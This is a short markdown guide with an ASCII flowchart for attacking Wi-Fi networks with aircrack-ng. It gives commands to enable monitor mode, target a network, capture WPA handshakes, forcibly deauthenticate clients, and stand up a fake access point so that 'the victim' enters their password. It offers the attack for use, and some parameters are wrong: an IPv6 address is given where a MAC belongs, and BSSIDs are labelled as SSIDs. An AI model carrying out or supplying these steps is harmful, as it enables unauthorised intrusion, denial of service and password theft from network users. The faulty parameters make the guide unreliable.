# AIRCRACK GUIDE

```
████████████████████████████████████████████████████
█                  AIRCRACK FLOW                  █
████████████████████████████████████████████████████

        [ wlan0 ]
           |
           v
   ┌───────────────────┐
   │  MONITOR MODE     │
   │  airmon-ng start  │
   └─────────┬─────────┘
             |
             v
   ┌───────────────────┐
   │  SCAN NETWORKS    │
   │  airodump-ng      │
   └─────────┬─────────┘
             |
             v
   ┌───────────────────┐
   │  TARGET LOCKED    │
   │  BSSID + CHANNEL  │
   └─────────┬─────────┘
             |
             v
   ┌───────────────────┐
   │  EAPOL FILTER     │
   │  HANDSHAKE WATCH  │
   └─────────┬─────────┘
             |
      ┌──────┴──────┐
      |             |
      v             v
┌─────────────┐  ┌─────────────────┐
│ NO HANDSHAKE│  │ HANDSHAKE OK     │
│ DEAUTH      │  │ capture.cap     │
└──────┬──────┘  └────────┬────────┘
       |                  |
       v                  v
┌─────────────┐    ┌─────────────────┐
│ CLIENT DROP │    │ STOP MONITOR    │
│ aireplay-ng │    │ RESTORE IFACE   │
└──────┬──────┘    └────────┬────────┘
       |                    |
       v                    v
┌────────────────────────────────────────┐
│           FAKE ACCESS POINT            │
│      airbase-ng  SSID: "wifi"          │
│      MAC: AA:BB:CC:DD:EE:FF             │
└──────────────────┬─────────────────────┘
                   |
                   v
        ┌────────────────────────┐
        │  CLIENT CONNECTS       │
        │  PASSWORD ENTRY        │
        └────────────────────────┘


████████████████████████████████████████████████████
█   01001000 01000001 01000011 01001011  █
█   01001001 01001110 01000111              █
████████████████████████████████████████████████████

```


## Check if the card supports replay for brute force

Please disregard the "<>"

`aireplay-ng -9 -e teddy -a fe80::c18a:b505:4f0c:aae8 <name-your-device (wlan0,wlan1,wlp6s0 ...) >`

## If you don't know the name, open the terminal and type iwconfig in the terminal.

## EAPOL Filter for Handshake Capture

Use EAPOL as filter to show only handshake packets.

Handshake = Handshake is the process where two machines authenticate each other and are ready to start communication.



## Disconnect a client:

Start aircrack:

`airmon-ng start <your-device>`

`airmon-ng check kill`



View all interfaces and networks:

`airodump-ng <your-device-mon>`



Focus on target network:

`airodump-ng -c 4 --bssid <target ssid> -w capture <your-device> --ignore-negative-one`



Disconnect client:

`aireplay-ng --deauth 0 -a <ap ssid> -c <client ssid to disconnect> <your-device> --ignore-negative-one`



## Stop monitor mode and restart wireless interface:

`airmon-ng stop <your-device-mon>`

`ifconfig <your-device> up`

`/etc/init.d/network-manager restart`

`ip link set <your-device> up`



## AFTER DISCONNECTING THE CLIENT, CREATE FAKE AP:

Scenario: After disconnecting the client, create a fake AP so the victim enters their password



## Airbase

`airbase-ng -c 6 -e wifi -a AA:BB:CC:DD:EE:FF wlan0mon` (invent a MAC, set the channel you configured and create the SSID 'wifi')

